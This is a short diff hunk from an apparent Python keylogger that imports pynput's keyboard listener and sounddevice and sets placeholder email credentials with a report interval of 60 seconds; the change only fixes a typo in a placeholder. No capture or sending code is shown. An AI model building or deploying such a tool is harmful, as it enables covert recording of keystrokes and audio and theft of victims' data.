@@ -10,7 +10,7 @@ import sounddevice as sd
 from pynput import keyboard
 from pynput.keyboard import Listener
 
-EMAIL_ADDRESS = "YOU_EMAIL"
+EMAIL_ADDRESS = "YOUR_EMAIL"
 EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
 SEND_REPORT_EVERY = 60 # as in seconds
 
